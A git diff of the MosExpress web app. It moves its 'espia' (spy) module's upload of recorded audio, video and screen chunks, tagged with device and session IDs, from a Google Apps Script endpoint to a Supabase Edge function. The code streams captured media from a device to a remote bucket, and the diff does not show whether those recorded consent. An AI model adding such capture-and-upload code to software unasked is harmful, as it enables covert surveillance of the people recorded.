@@ -7,7 +7,7 @@
   <script>
     // ── Banner de versión en consola + chequeo de actualización (igual que MOS) ──
     (function () {
-      var V = '2.8.188';   // ⚠ bumpear junto con sw.js + version.json (ESTE es el que compara el auto-update)
+      var V = '2.8.189';   // ⚠ bumpear junto con sw.js + version.json (ESTE es el que compara el auto-update)
       var s = 'font-size:14px;font-weight:900;padding:3px 10px;border-radius:6px;';
       console.log('%c ME (MosExpress) cargado · v' + V + ' ', 'background:#10b981;color:#000;' + s);
       try {
@@ -14501,6 +14501,26 @@
             espiaCerrarSesion: 'espia_cerrar_sesion'
         };
         async function _espiaCliPostMOS(accion, params) {
+            // [cero-GAS F4] Chunk de media (audio/video/screen) → Edge `espia-chunk` (Storage bucket espia). Antes GAS.
+            if (accion === 'espiaSubirChunk' || accion === 'subirChunkAudio') {
+                try {
+                    const tk = await _mintTokenSB(); if (!tk) return { ok: false };
+                    const pp = params || {};
+                    const tipo = pp.tipo || 'audio';
+                    const res = await _meFetchTimeout(`${SUPABASE_URL}/functions/v1/espia-chunk`, {
+                        method: 'POST',
+                        headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': 'Bearer ' + tk, 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            deviceId: pp.deviceId || deviceId.value || 'unknown', tipo,
+                            ts: pp.ts || Date.now(), idx: pp.idx || 0,
+                            base64: pp.contenido || pp.audioBase64 || '', mime: pp.mimeType || (tipo === 'audio' ? 'audio/webm' : 'video/webm'),
+                            idSesion: pp.sesionId || pp.idSesion || (_espiaCli && _espiaCli.sesionId) || ''
+                        })
+                    }, 20000);
+                    const d = await res.json().catch(() => null);
+                    return d || { ok: false };
+                } catch (_) { return { ok: false }; }
+            }
             // Supabase-first: RPC mos.espia_* vía mint-me; mismo shape {ok,data}. Fallback GAS.
             const rpc = _ESPIA_RPC_ME[accion];
             if (rpc && window.ESPIA_DIRECTO !== false) {
@@ -15277,15 +15297,10 @@
                     try {
                         const b64 = await _audioBlobToBase64(evt.data);
                         const idx = _audioChunkIdx++;
-                        await fetch(MOS_GAS_URL, {
-                            method: 'POST',
-                            body: JSON.stringify({
-                                action: 'subirChunkAudio',
-                                idSesion: _audioSesionId,
-                                idx: idx,
-                                audioBase64: b64,
-                                mimeType: mimeType
-                            })
+                        // [cero-GAS F4] audio chunk → Edge `espia-chunk` (Storage) vía el helper unificado.
+                        await _espiaCliPostMOS('subirChunkAudio', {
+                            idSesion: _audioSesionId, deviceId: deviceId.value || 'unknown',
+                            tipo: 'audio', idx: idx, audioBase64: b64, mimeType: mimeType
                         });
                     } catch(e) { console.warn('[Audio] chunk falló:', e?.message); }
                 };
